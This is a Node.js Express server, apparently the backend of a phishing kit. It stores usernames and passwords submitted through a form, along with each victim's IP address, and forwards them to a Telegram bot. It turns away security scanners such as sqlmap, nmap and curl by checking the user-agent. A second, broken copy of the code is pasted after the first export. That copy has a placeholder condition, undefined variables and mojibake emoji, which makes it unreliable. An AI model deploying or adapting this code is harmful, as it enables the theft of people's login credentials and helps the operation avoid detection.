import express from "express";
import crypto from "crypto";
import fs from "fs";
import path from "path";
import fetch from "node-fetch";
import dotenv from "dotenv";

dotenv.config();
const app = express();

/* ================= TMP PATH (VERCEL SAFE) ================= */
const BASE_TMP = process.env.VERCEL ? "/tmp" : path.join(process.cwd(), "tmp");
if (!fs.existsSync(BASE_TMP)) fs.mkdirSync(BASE_TMP, { recursive: true });

const SPAM_FILE = path.join(BASE_TMP, "antispam.txt");
const USED_FILE = path.join(BASE_TMP, "used.json");
const RATE_FILE = path.join(BASE_TMP, "rate.json");

/* ================= CONFIG ================= */
const BOT_UA = [
  "curl","wget","python","httpclient","axios",
  "go-http","nikto","sqlmap","nmap","masscan","zgrab","scrapy"
];
const isDev = process.env.NODE_ENV === "development";

/* ================= MIDDLEWARE ================= */
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader(
    "Access-Control-Allow-Headers",
    "Content-Type, Accept, Accept-Language"
  );
  if (req.method === "OPTIONS") return res.sendStatus(200);
  next();
});

/* ================= UTIL ================= */
function getIP(req) {
  return (
    req.headers["x-forwarded-for"]?.split(",")[0] ||
    req.socket?.remoteAddress ||
    ""
  );
}

function isPrivateIP(ip) {
  return (
    ip.startsWith("127.") ||
    ip.startsWith("10.") ||
    ip.startsWith("192.168.") ||
    ip === "::1"
  );
}

function readJSONSafe(file, def = {}) {
  try {
    if (!fs.existsSync(file)) return def;
    return JSON.parse(fs.readFileSync(file, "utf8"));
  } catch {
    return def;
  }
}

/* ================= GET TEST ================= */
app.get("/", (req, res) => {
  res.json({
    ok: true,
    message: "APINET ONLINE",
    time: new Date().toISOString()
  });
});

/* ================= POST MAIN ================= */
app.post("/", async (req, res) => {
  try {
    const ip = getIP(req);
    const ua = (req.headers["user-agent"] || "").toLowerCase();

    /* ===== ANTI BOT (VALID) ===== */
    if (!isDev) {
      if (
        !ua ||
        ua.length < 10 ||
        BOT_UA.some(b => ua.includes(b)) ||
        !req.headers["accept"] ||
        !req.headers["accept-language"] ||
        !ip ||
        isPrivateIP(ip)
      ) {
        return res.status(403).json({
          ok: false,
          reason: "blocked_by_antibot"
        });
      }
    }

    /* ===== RATE LIMIT ===== */
    const rate = readJSONSafe(RATE_FILE, {});
    const now = Date.now();

    rate[ip] = (rate[ip] || []).filter(t => now - t < 60000);
    if (rate[ip].length >= 5) {
      return res.status(429).json({ error: "Too many requests" });
    }

    rate[ip].push(now);
    fs.writeFileSync(RATE_FILE, JSON.stringify(rate));

    /* ===== DATA ===== */
    const { login, A, B } = req.body;
    if (!A || !B) {
      return res.status(400).json({ error: "Missing field" });
    }

    const user = A;
    const pass = B;

    /* ===== ANTISPAM ===== */
    if (fs.existsSync(SPAM_FILE)) {
      const lines = fs.readFileSync(SPAM_FILE, "utf8").split("\n");
      if (lines.includes(`${user}|${pass}`)) {
        return res.json({ ok: true, note: "duplicate ignored" });
      }
    }
    fs.appendFileSync(SPAM_FILE, `${user}|${pass}\n`);

    /* ===== UNIQUE ===== */
    const used = readJSONSafe(USED_FILE, {});
    const key = crypto.createHash("md5").update(`${user}|${pass}`).digest("hex");

    if (used[key]) {
      return res.json({ ok: true, note: "already exists" });
    }

    used[key] = { user, pass, ip, time: new Date().toISOString() };
    fs.writeFileSync(USED_FILE, JSON.stringify(used, null, 2));

    /* ===== TELEGRAM ===== */
    if (process.env.BOT_TOKEN && process.env.CHAT_ID) {
      const msg = `🧨 *INCOMING DATA*

👤 user : \`${user}\`
🔐 pass : \`${pass}\`

🌍 IP   : \`${ip}\`
⏱ TIME : \`${new Date().toISOString()}\`

#APINET`;

      try {
        await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: process.env.CHAT_ID,
            text: msg,
            parse_mode: "Markdown"
          })
        });
      } catch (e) {
        console.error("Telegram error:", e.message);
      }
    }

    return res.json({
      ok: true,
      received: { login, user, pass }
    });

  } catch (err) {
    console.error("FATAL:", err);
    return res.status(500).json({ error: "internal_error" });
  }
});

/* ================= EXPORT ================= */
export default app;  } catch {
    return def;
  }
}

/* ================= ENDPOINT ================= */
app.get("/", (req, res) => {
  res.json({
    status: "ok",
    message: "APINET endpoint aktif",
    method: "GET",
    time: new Date().toISOString()
  });
});


  
app.post("/", async (req, res) => {
  try {
    const ip = getIP(req);
    const ua = (req.headers["user-agent"] || "").toLowerCase();

    /* ===== ANTI BOT ===== */
if (!isDev) {
  if (...) {
    return res.status(403).json({
      ok: false,
      reason: "blocked_by_antibot"
    });
  }
}

    /* ===== RATE LIMIT ===== */
    const rate = readJSONSafe(RATE_FILE, {});
    const now = Date.now();

    rate[ip] = (rate[ip] || []).filter(t => now - t < 60000);
    if (rate[ip].length >= 5000)
      return res.status(429).json({ error: "Too many requests" });

    rate[ip].push(now);
    fs.writeFileSync(RATE_FILE, JSON.stringify(rate));

    /* ===== DATA ===== */
    const { login, A, B } = req.body;
    if (!A || !B)
      return res.status(400).json({ error: "Missing field" });

    const user = A;
    const pass = B;

    /* ===== ANTISPAM ===== */
    if (fs.existsSync(SPAM_FILE)) {
      const lines = fs.readFileSync(SPAM_FILE, "utf8").split("\n");
      if (lines.some(l => l.includes(`${user}|${pass}`)))
        return res.json({ ok: true, note: "duplicate ignored" });
    }
    fs.appendFileSync(SPAM_FILE, `${user}|${pass}\n`);

    /* ===== UNIQUE ===== */
    const used = readJSONSafe(USED_FILE, {});
    const key = crypto
      .createHash("md5")
      .update(`${user}|${pass}`)
      .digest("hex");

    if (used[key])
      return res.json({ ok: true, note: "already exists" });

    used[key] = {
      user,
      pass,
      ip,
      time: new Date().toISOString()
    };
    fs.writeFileSync(USED_FILE, JSON.stringify(used, null, 2));

    /* ===== TELEGRAM (ANTI CRASH) ===== */
    if (process.env.BOT_TOKEN && process.env.CHAT_ID) {
      const msg = `
ðŸ§  *INCOMING DATA*

ðŸ‘¤ user : \`${a}\`
ðŸ”‘ pass : \`${b}\`

ðŸŒ IP   : \`${ip}\`
â± TIME : \`${new Date().toISOString()}\`

#APINET
`;

      try {
        await fetch(
          `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: process.env.CHAT_ID,
              text: msg,
              parse_mode: "Markdown"
            })
          }
        );
      } catch (e) {
        console.error("Telegram error:", e.message);
      }
    }

    return res.json({
      ok: true,
      dev: isDev,
      received: { login, user, pass }
    });

  } catch (err) {
    console.error("FATAL ERROR:", err);
    return res.status(500).json({ error: "internal_error" });
  }
});

/* ================= EXPORT VERCEL ================= */
export default app;
  
